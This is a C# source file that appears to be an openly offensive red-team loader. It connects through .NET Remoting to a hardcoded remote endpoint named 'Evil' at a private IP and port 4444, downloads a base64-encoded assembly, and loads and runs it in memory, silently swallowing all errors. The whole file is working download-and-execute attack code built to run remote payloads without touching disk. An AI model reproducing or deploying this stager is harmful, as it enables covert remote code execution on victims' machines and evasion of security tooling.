using System;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Tcp;
using System.Reflection;
using System.IO;
using System.Linq;

/*
Author: @anthemtotheego
License: BSD 3-Clause    
*/

class Program
{
    public static void Main(string[] args)
    {
        try
        {
            //TCP Channel
            TcpClientChannel clientChannel = new TcpClientChannel();
            ChannelServices.RegisterChannel(clientChannel, false);

            //Create an instance of remoteObject
            Type Type = typeof(Interface);
            Interface remoteObject = (Interface)Activator.GetObject(Type, "tcp://192.168.55.250:4444/Evil");

            //Return source from server
            String[] source = remoteObject.b64Assembly1();

            //Decode and load assembly
            var decode = Convert.FromBase64String(source[0]);

            //Args
            object[] cmd = args.ToArray();

            //Read the bytes from the binary file
            MemoryStream ms = new MemoryStream(decode);
            BinaryReader br = new BinaryReader(ms);
            byte[] bin = br.ReadBytes(Convert.ToInt32(ms.Length));
            ms.Close();
            br.Close();
            Assembly a = Assembly.Load(bin);
            try
            {
                a.EntryPoint.Invoke(null, new object[] { cmd });
            }
            catch
            {
                MethodInfo method = a.EntryPoint;
                if (method != null)
                {
                    object o = a.CreateInstance(method.Name);
                    method.Invoke(o, null);
                }
            }
        }
        catch
        { }
    }
}
//Public Interface
public interface Interface
{
    String[] b64Assembly1();
}

